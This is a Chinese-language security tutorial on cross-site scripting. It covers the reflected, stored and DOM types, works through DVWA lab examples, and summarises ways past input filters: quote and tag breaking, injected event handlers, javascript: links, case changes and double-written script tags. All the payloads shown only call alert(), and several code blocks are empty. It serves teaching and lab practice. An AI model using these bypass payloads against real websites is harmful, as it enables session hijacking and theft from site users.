#  XSS跨站脚本攻击漏洞   
 船山信安   2024-05-11 00:03  
  
## 一、简介  
### 1.概念  
  
XSS又叫CSS（Cross Site Script）跨站脚本攻击是指恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。XSS漏洞通常是通过PHP的输出函数将Javascript代码输出到html页面中，通过用户本地浏览器执行的，所以xss漏洞关键就是寻找参数未过滤的输出函数。  
  
常见的输出函数有：  
> echo printf printprint_r sprintf dievar-dump var_export.  
  
### 2.分类  
  
（1）反射型XSS  
  
一般在留言板，用户发帖，用户回帖，经过后端但不过数据库  
  
（2）存储型XSS  
  
一般在URL，搜索框，也有在GET和POST参数中，经过后端同时经过数据库  
  
（3）DOM型XSS  
  
基于DOM文档对象模型的一种XSS，不与后台服务器产生数据交互,通过前端的dom节点形成的xss漏洞  
## 二、常见XSS的Payload构造及绕过  
### 1.反射型XSS  
  
（1）常规  
```
```  
  
（2）双写绕过  
```
```  
  
（3）大小写绕过（随机选择改写）  
```
```  
  
（4）<img>绕过（过滤掉了<>，script）  
> <img src=1οnerrοr=alert(1)  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/7nIrJAgaibicO2PZ0w5RkLWKiacZ0L6C5mhzibicKafR20o4G9uYUksv6aTzhz5ecK0iaHaq4dktd5UjPXE4LneC7a6g/640?wx_fmt=jpeg&from=appmsg "")  
### 2.存储型XSS  
  
以DVWA为例，可以看到，当我们再name框中输入语句时长度被限制了。  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/7nIrJAgaibicO2PZ0w5RkLWKiacZ0L6C5mhq26muxUP7yArAwQecrBlT9kch0Snu6kqWeYBQcIdlOMQsg6wstMnWQ/640?wx_fmt=jpeg&from=appmsg "")  
  
打开F12，定位到name框，使用“查看器”旁边的定位功能  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/7nIrJAgaibicO2PZ0w5RkLWKiacZ0L6C5mh4TjHqviaOlXV4iashHdNJMtcLQXxx9tgNBmZyfLJmtmvvtQXp3IoR8Ow/640?wx_fmt=jpeg&from=appmsg "")  
  
将长度改长一些  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/7nIrJAgaibicO2PZ0w5RkLWKiacZ0L6C5mhZueaoGofhQawGPT2rvjCbqwpYDbYuzIibpeZ3Gl6Lc0IaGONHNBoVsg/640?wx_fmt=jpeg&from=appmsg "")  
  
这个时候再去输入语句，执行  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/7nIrJAgaibicO2PZ0w5RkLWKiacZ0L6C5mhvVAy0QlJsj0QicJGkmfEP9rPazuqcTBQOjpp75AeILkxZckNcvoTmaA/640?wx_fmt=jpeg&from=appmsg "")  
### 3.DOM型XSS  
  
以DVWA靶场的Medium级别DOM型XSS为例  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/7nIrJAgaibicO2PZ0w5RkLWKiacZ0L6C5mh7IVCamm1MSbibypTJNeia3qeBEGybuH0gWrPcetKgNyicuSrzhtEicYhtw/640?wx_fmt=jpeg&from=appmsg "")  
  
点击select，发现URL上出现了一个default=English，我们可以尝试将English替换成JS语句去执行，但是输入JS语句之后发现无法执行，那么可能是对<script>等语句进行了过滤。  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/7nIrJAgaibicO2PZ0w5RkLWKiacZ0L6C5mhSGXl5ULkCnmyibibtZCvSuMXeJ51fUHGsliaoXcPvyMlDCfy4GeCNFD7Q/640?wx_fmt=jpeg&from=appmsg "")  
  
查看源代码，可以看到源代码对<script进行了过滤，所以我们不能再使用<script>  
```
```  
  
  
打开F12并定位，可以看到语句已经存入了value值，但是没有执行成功是因为没有闭合<option>标签，再加上本身过滤了<script>函数，那么我们可以将语句构造如下  
> ></option></select><img src=1 onerror=alert('xss');>  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/7nIrJAgaibicO2PZ0w5RkLWKiacZ0L6C5mhbhYUrddkR4ibzWy5IB7ezPq4tju2gD8PDTpNUvqfA69EmzmicXOjUpng/640?wx_fmt=jpeg&from=appmsg "")  
  
执行成功  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/7nIrJAgaibicO2PZ0w5RkLWKiacZ0L6C5mhfC5OFdwFdyL7wuZazFl839TKIxtPt63ZRHLDO0Aj1yJqG59rhBUonw/640?wx_fmt=jpeg&from=appmsg "")  
### 4.针对各种过滤的绕过方法总结  
  
（1）未对参数进行任何过滤的  
>   
> <script>alert()</script>  
> <img src=1 onerror=alert()>  
  
  
（2）payload被引号包裹的  
  
例如：  
<input name=keyword value="<script>alert()</script>">  
> #闭合标签和字符串  
> 先闭合引号，对于标签中不能包含script标签的，  
> 在闭合此标签 "><script>alert()</script>"  
> (在最后加引号是因为引号总是成对出现的，这个引号是为了闭合原input标签中value属性值的最后一个引号)  
>   
>   
> #向标签中添加属性和方法  
> 先闭合引号，在向input标签中添加onclick方法和type属性，  
> 这样点击文本框时就可以执行代码。  
> payload：" onclick=alert() type="text" "  
  
  
（3）payload被更改的  
  
如果网页对script和onclick对做了防范， 例如我们的payload为："><script>alert()</script>" 注入到页面的效果为：<input name=keyword value="<scr_ipt>">,  
若选用向标签中添加onclick方法的方式。onclick会被更改为o_nclick 我们可以先屏蔽注入点初的标签  
> 改用在页面中插入a标签 "><a href=javascript:alert()>  
> #这里是超链</a> href值为javascript:是目的是为了防止链接跳转，这里可以利用一下来执行js代码  
  
  
（4）payload被更改但是不要求大小写的  
  
和刚刚一样，若我们的onclick注入到页面中被更改为o_nclick,我们可以更改一下大小写  
>   
> Onclick=alert() type="text"  
  
  
（5）payload关键字被清除的  
  
若我们的payload为 ："><script>alert()</script>" 注入到页面的效果为 "><>alert()</>" 可以看到我们的关键字script被清除，此时可以采用双写绕过，在script中在插入一个script  
> ><scrscriptipt>alert()</sscriptcript>  
  
  
浏览器将script中插入的script清除后，我们之前的script依然存在 输入到页面的效果为：><script>alert()</script>  
  
来源：https://www.freebuf.com/  
  
  
